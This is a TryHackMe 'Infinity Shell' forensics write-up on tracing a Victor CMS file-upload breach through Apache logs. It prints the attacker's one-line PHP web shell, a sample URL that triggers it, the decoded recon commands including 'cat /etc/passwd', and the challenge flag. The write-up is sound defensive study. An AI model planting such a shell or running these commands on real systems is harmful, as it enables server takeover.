---
title: "TryHackMe: Infinity Shell Writeup"
date: 2025-03-06
categories: [Writeups, TryHackMe,]
tags: [web-shell, log-analysis, php, rce, forensics, apache]
image:
  path: /assets/img/banners/InfinityShell.png
---

## Scenario

> Cipher's legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

We are given access to a compromised Linux machine running an Apache web server hosting a PHP-based CMS. Our goal is to investigate how the attacker got in, what they planted, and what commands they ran after gaining access.

---

## Initial Recon 

The first step is getting a lay of the land. Looking at the web root reveals a single CMS application:

![Suspicious folder listing](/assets/img/TryHackMe/InfinityShell/susfolder.png)

```bash
ls -la /var/www/html/
```

We can see a directory called `CMSsite-master` owned by `www-data`. The name immediately suggests this is **Victor CMS** a PHP web application. Before digging further, it's worth looking up whether this CMS has any known vulnerabilities, so we know what to look for.

---

## Researching the CMS

A quick search on Exploit-DB reveals a relevant entry: **EDB-ID 49310 Victor CMS 1.0 File Upload to RCE**.

![Exploit-DB entry for Victor CMS RCE](/assets/img/TryHackMe/InfinityShell/reasearch1.png)

The exploit abuses the profile image upload feature. The application fails to validate that uploaded files are actually images, so an attacker can upload a `.php` file instead. The shell ends up in the `img/` folder and can be triggered directly via URL. This immediately tells us where to look: the `img/` directory is the likely drop point for any malicious file.

Checking the associated CVE gives us more detail:

![CVE-2021-25203 description](/assets/img/TryHackMe/InfinityShell/reasearch2.png)

**CVE-2021-25203** says the arbitrary file upload path goes through `\CMSsite-master\admin\includes\admin_add_post.php`. Armed with this, we know folders to inspect should be: `img/` and `includes/`.

---

## Identifying the Web Shell

Digging into the application's file structure, we list the `includes/` and `img/` directories:

![Suspicious image directory with PHP file](/assets/img/TryHackMe/InfinityShell/susimage.png)

```bash
ls -la includes/
ls img/
```

The `includes/` directory contains standard PHP files like `login.php`, `navbar.php`, etc. nothing immediately alarming. However, the `img/` directory, which is meant to store uploaded images, contains a file that stands out: **`images.php`**. A PHP file living among image assets is a major red flag. This is almost certainly the web shell planted by the attacker.

---

## Examining the Web Shell

Viewing the contents of `images.php` confirms our suspicion:

![Web shell content](/assets/img/TryHackMe/InfinityShell/catrevshell.png)

```bash
cat img/images.php
```

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This is a classic one-liner web shell. Here's what it does:

- `$_GET['query']` reads a value from the URL parameter named `query`
- `base64_decode(...)` decodes it from Base64, adding a layer of obfuscation to hide the real commands from casual log inspection
- `system(...)` executes the decoded string as an OS command on the server

So the attacker could visit a URL like:
```
http://target/CMSsite-master/img/images.php?query=d2hvYW1p
```
...and the server would decode `d2hvYW1p` → `whoami` and return the result.

---

## Log Analysis Finding the Exploit in Action

Now we know what the shell looks like let's find evidence of it being used. Apache stores access logs in `/var/log/apache2/`. We search for requests hitting `images.php`:

![Grepping Apache logs for images.php](/assets/img/TryHackMe/InfinityShell/logreview.png)

```bash
cat access.log | grep "images.php"
cat other_vhosts_access.log | grep "images.php"
cat other_vhosts_access.log.1 | grep "images.php"
```
![Extracting query values from logs](/assets/img/TryHackMe/InfinityShell/logreviewqueries.png)

The rotated log file `other_vhosts_access.log.1` is where the interesting traffic lives. We can see multiple HTTP `200` (successful) responses to requests for `/CMSsite-master/img/images.php` with different `?query=` values confirming the attacker was actively using the shell.

---

## Extracting the Base64-Encoded Commands

To isolate just the encoded payloads, we use `grep` with the `-oP` flag (output only the matching part, using Perl regex):

```bash
grep -oP 'images\.php\?query=\K[^ ]*' other_vhosts_access.log.1
```

Breaking this down:
- `-o` print only the matched portion, not the whole line
- `-P` enable Perl-compatible regex
- `images\.php\?query=\K` match the literal string `images.php?query=`, then `\K` discards everything before it (so only what follows is captured)
- `[^ ]*` capture everything up to the next space (the full Base64 value)

The output is a list of Base64 strings each one an encoded command the attacker ran. We then redirect this output to a file for batch decoding:

```bash
sudo grep -oP 'images\.php\?query=\K[^ ]*' other_vhosts_access.log.1 > ~/b64.txt
```
![grep](/assets/img/TryHackMe/InfinityShell/grep.png)

---

## Decoding the Commands

With all payloads saved, we decode the entire file at once:

```bash
base64 -d ~/b64.txt
```
![Decoding the base64 commands](/assets/img/TryHackMe/InfinityShell/decode.png)

The decoded output reveals the exact commands the attacker executed through the web shell:

```
whoami
ls
echo 'THM{sup3r_34sy_w3bsh3ll}'
ifconfig
cat /etc/passwd
id
```

This is a typical post-exploitation reconnaissance sequence:
- `whoami` confirm which user they're running as (`www-data`)
- `ls` list files in the current directory
- `echo 'THM{...}'` the flag for this challenge, confirming successful exploitation
- `ifconfig` gather network interface information
- `cat /etc/passwd` dump local user accounts
- `id` confirm UID/GID and group memberships

---
